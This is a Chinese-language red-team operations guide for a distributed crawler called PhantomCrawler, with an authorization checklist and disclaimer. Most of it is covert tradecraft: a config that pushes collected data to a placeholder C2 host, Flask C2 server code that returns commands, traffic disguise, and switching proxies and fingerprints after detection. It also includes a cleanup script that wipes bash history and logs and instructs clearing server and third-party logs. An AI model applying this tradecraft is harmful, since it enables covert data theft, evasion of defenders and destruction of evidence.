# PhantomCrawler - 红队行动指南

## 目录

1. [行动准备](#行动准备)
2. [C2通信配置](#c2通信配置)
3. [部署策略](#部署策略)
4. [日志管理与痕迹抹除](#日志管理与痕迹抹除)
5. [应急响应流程](#应急响应流程)
6. [数据处理与报告生成](#数据处理与报告生成)
7. [行动后的清理](#行动后的清理)

## 行动准备

### 授权确认

在开始任何渗透测试活动前，请确保：

- **获得书面授权**：详细说明测试范围、目标、时间窗口和允许的技术
- **明确边界**：确定哪些系统和数据是禁止访问的
- **建立沟通渠道**：与蓝队和系统管理员建立紧急联系机制
- **了解法律风险**：熟悉相关法律法规，特别是关于数据保护和隐私的规定

### 工具预配置

1. **安装依赖**
   ```bash
   cd PhantomCrawler
   pip install -r requirements.txt
   playwright install
   ```

2. **配置基础参数**
   ```python
   # 创建自定义配置文件
   from src.configs.config import Config
   config = Config()
   
   # 设置安全选项
   config.set('security.clean_logs_after_run', True)
   config.set('security.obfuscate_logs', True)
   config.set('security.emergency_exit_on_detection', True)
   
   # 保存配置
   import yaml
   with open('configs/mission_config.yaml', 'w') as f:
       yaml.dump(config.export(), f)
   ```

3. **准备代理资源**
   - 收集高质量的代理服务器列表
   - 测试每个代理的连通性和匿名性
   - 确保代理分布在不同地理位置

## C2通信配置

### 安全的命令控制通道设置

PhantomCrawler支持隐蔽的C2通信机制，以下是设置安全通道的步骤：

1. **设置远程服务器**
   - 选择信誉良好的VPS提供商
   - 使用HTTPS协议加密通信
   - 配置服务器证书，推荐使用Let's Encrypt
   - 实施基本的访问控制和入侵检测

2. **配置加密参数**
   ```python
   # 设置远程推送
   config.set('persistence.remote_push_enabled', True)
   config.set('persistence.remote_push_url', 'https://your-c2-server.com/endpoint')
   config.set('persistence.remote_push_encryption', True)
   
   # 使用非标准端口（可选，但增加隐蔽性）
   # config.set('persistence.remote_push_url', 'https://your-c2-server.com:8443/endpoint')
   ```

3. **通信流量伪装**
   - 将C2通信伪装成正常的API调用或Web流量
   - 使用常见的HTTP头部和请求模式
   - 实现心跳机制，避免长时间空闲连接

4. **密钥管理**
   - 使用强密码学密钥保护通信
   - 定期轮换密钥
   - 考虑使用密钥分片技术

### C2服务器端实现

在C2服务器上，您需要部署一个简单的接收端点：

```python
# 示例C2服务器端点（使用Flask）
from flask import Flask, request, jsonify
import json
import base64
from cryptography.fernet import Fernet

app = Flask(__name__)

# 加密密钥（生产环境中应从安全位置获取）
ENCRYPTION_KEY = b'your-encryption-key-here'
cipher = Fernet(ENCRYPTION_KEY)

@app.route('/endpoint', methods=['POST'])
def receive_data():
    # 接收加密数据
    encrypted_data = request.data
    
    try:
        # 解密数据
        decrypted_data = cipher.decrypt(encrypted_data)
        data = json.loads(decrypted_data)
        
        # 处理数据并存储
        save_to_secure_storage(data)
        
        # 返回命令（如果有）
        return jsonify({'status': 'success', 'commands': get_pending_commands()})
    except Exception as e:
        # 记录错误但返回正常响应以避免暴露问题
        print(f"Error processing data: {str(e)}")
        return jsonify({'status': 'success', 'commands': []})

def save_to_secure_storage(data):
    # 实现安全存储逻辑
    pass

def get_pending_commands():
    # 返回待执行的命令
    return []

if __name__ == '__main__':
    # 使用HTTPS
    app.run(host='0.0.0.0', port=443, ssl_context=('cert.pem', 'key.pem'))
```

### 通信安全最佳实践

- **证书固定（Certificate Pinning）**：防止中间人攻击
- **请求混淆**：使用随机的请求参数和结构
- **频率限制模拟**：模拟正常用户的访问模式
- **备用通道**：准备多个备用C2服务器，以防主要通道被阻断
- **定期测试**：在实际行动前测试整个通信链路

## 部署策略

### 分布式部署方案

PhantomCrawler的Master-Worker架构允许在多个节点上分布式部署：

1. **Master节点设置**
   ```python
   config.set('distributed.enabled', True)
   config.set('distributed.node_type', 'master')
   config.set('distributed.redis_url', 'redis://your-redis-server:6379')
   config.set('distributed.master_host', 'your-master-server.com')
   config.set('distributed.master_port', 5555)
   ```

2. **Worker节点配置**
   ```python
   config.set('distributed.enabled', True)
   config.set('distributed.node_type', 'worker')
   config.set('distributed.redis_url', 'redis://your-redis-server:6379')
   config.set('distributed.master_host', 'your-master-server.com')
   config.set('distributed.master_port', 5555)
   ```

3. **节点分布策略**
   - 将Worker节点部署在不同的地理位置和网络环境
   - 使用不同的云服务提供商
   - 混合使用虚拟机、容器和物理机器

### 容器化部署

使用Docker容器可以快速部署和销毁Worker节点：

```dockerfile
# Dockerfile示例
FROM python:3.9-slim

WORKDIR /app

# 安装系统依赖
RUN apt-get update && apt-get install -y \
    gcc \
    libpq-dev \
    && rm -rf /var/lib/apt/lists/*

# 安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 复制应用代码
COPY . .

# 配置环境变量
ENV WORKER_ID=${WORKER_ID:-worker-$(uuidgen)}
ENV MASTER_HOST=${MASTER_HOST:-localhost}
ENV MASTER_PORT=${MASTER_PORT:-5555}

# 运行Worker
CMD ["python", "src/scripts/worker.py"]
```

部署命令：
```bash
docker run -d \
  --name phantom-worker-1 \
  -e WORKER_ID=worker-1 \
  -e MASTER_HOST=your-master-server.com \
  -e MASTER_PORT=5555 \
  your-docker-image
```

## 日志管理与痕迹抹除

### 安全日志配置

PhantomCrawler提供了多层日志保护机制：

```python
# 配置日志安全选项
config.set('security.clean_logs_after_run', True)
config.set('security.obfuscate_logs', True)
config.set('security.heartbeat_interval', 300)  # 秒
```

### 日志混淆技术

- **敏感信息过滤**：自动过滤日志中的IP、密钥等敏感信息
- **时间偏移**：在日志中使用相对时间而非绝对时间
- **散列处理**：对URL和标识符使用单向散列
- **日志分片**：将日志分散存储在多个位置

### 痕迹抹除策略

1. **系统级痕迹抹除**
   - 清理shell历史记录
   - 删除临时文件和缓存
   - 清理浏览器数据
   - 重置系统时间戳

2. **网络痕迹抹除**
   - 清除DNS缓存
   - 重置TCP连接状态
   - 删除代理访问记录

3. **自动化清理脚本**

```python
# cleanup.py - 执行后清理所有痕迹
import os
import shutil
import subprocess
import time

def cleanup():
    # 清理Python缓存
    if os.path.exists('__pycache__'):
        shutil.rmtree('__pycache__')
    
    # 清理日志文件
    log_files = ['phantom.log', 'crawler.log', 'error.log']
    for log_file in log_files:
        if os.path.exists(log_file):
            os.remove(log_file)
    
    # 清理历史记录（Linux）
    if os.path.exists(os.path.expanduser('~/.bash_history')):
        open(os.path.expanduser('~/.bash_history'), 'w').close()
    
    # 清理临时目录
    temp_dir = os.path.join(os.path.expanduser('~'), 'temp')
    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
    
    print("[+] 清理完成")

if __name__ == '__main__':
    cleanup()
```

## 应急响应流程

### 被发现时的应对措施

当检测到被目标发现或封锁时，应立即执行以下步骤：

1. **激活应急模式**
   ```python
   # 在代码中实现
   if is_detected():
       activate_emergency_mode()
   ```

2. **立即停止活动**
   - 终止所有爬取任务
   - 断开所有连接
   - 不要尝试清理痕迹（可能会留下更多证据）

3. **切换身份和基础设施**
   - 立即切换到备用IP和代理
   - 使用新的会话ID和指纹
   - 考虑使用备用C2服务器

4. **分析检测原因**
   - 检查日志中的异常模式
   - 分析最后执行的操作
   - 确定可能的触发因素

5. **调整策略后重试**
   - 降低爬取频率
   - 增强伪装技术
   - 避免之前触发检测的模式

### 应急模式实现

```python
def activate_emergency_mode():
    """激活应急模式，执行紧急撤退程序"""
    print("[!] 检测到可能被发现，激活应急模式...")
    
    # 立即停止所有任务
    stop_all_tasks()
    
    # 关闭所有连接
    close_all_connections()
    
    # 保存关键信息（如果安全）
    save_critical_data()
    
    # 触发清理程序
    if global_config.get('security.clean_logs_after_run', False):
        cleanup_traces()
    
    # 可选：通知操作员
    notify_operator("应急模式已激活")
    
    # 根据配置决定是否终止程序
    if global_config.get('security.emergency_exit_on_detection', True):
        print("[!] 应急退出程序")
        exit(1)
```

## 数据处理与报告生成

### 安全数据处理

1. **数据加密存储**
   ```python
   config.set('persistence.storage_mode', 'encrypted_sqlite')
   config.set('persistence.sqlite_encryption_key', 'strong-password-here')
   ```

2. **数据分类与标记**
   - 对收集的数据进行敏感级别分类
   - 标记潜在的个人身份信息
   - 实施数据最小化原则

3. **安全传输**
   - 使用SFTP或加密的API传输数据
   - 实施端到端加密
   - 考虑使用隐写术隐藏敏感数据

### 报告生成最佳实践

1. **匿名化处理**
   - 移除报告中的IP地址和域名
   - 使用占位符替代真实标识符
   - 模糊化可能泄露环境信息的细节

2. **详细但谨慎**
   - 详细记录发现的问题和技术细节
   - 避免提供完整的攻击路径和代码
   - 注重描述防御措施而非攻击方法

3. **专业格式**
   - 使用标准化的安全报告模板
   - 包含严重级别评分和修复建议
   - 提供清晰的时间表和证据

## 行动后的清理

### 完整清理清单

在渗透测试结束后，确保执行以下清理步骤：

1. **移除所有部署的组件**
   - 删除所有Worker节点
   - 关闭C2服务器
   - 移除所有临时文件和配置

2. **撤销所有访问权限**
   - 撤销API密钥和访问凭证
   - 删除创建的测试账户
   - 移除临时添加的权限

3. **清理所有日志**
   - 清除本地日志文件
   - 清除服务器日志
   - 清除第三方服务的日志

4. **验证清理结果**
   - 检查是否有残留的进程或服务
   - 验证没有留下后门或持久化机制
   - 确认所有痕迹都已被清除

### 最终报告与总结

1. **行动总结**
   - 记录使用的技术和方法
   - 总结发现的问题和挑战
   - 评估工具的有效性

2. **经验教训**
   - 分析成功和失败的原因
   - 记录需要改进的地方
   - 分享最佳实践和技巧

3. **工具维护**
   - 更新工具以修复发现的问题
   - 增强对抗新检测技术的能力
   - 更新文档和使用指南

---

**重要提示**：本指南仅适用于授权的渗透测试活动。使用PhantomCrawler进行未授权的活动可能违反法律法规。始终遵循道德黑客和红队测试的最佳实践。

*PhantomCrawler红队专用版* - 仅供授权使用

*最后更新：2025年10月*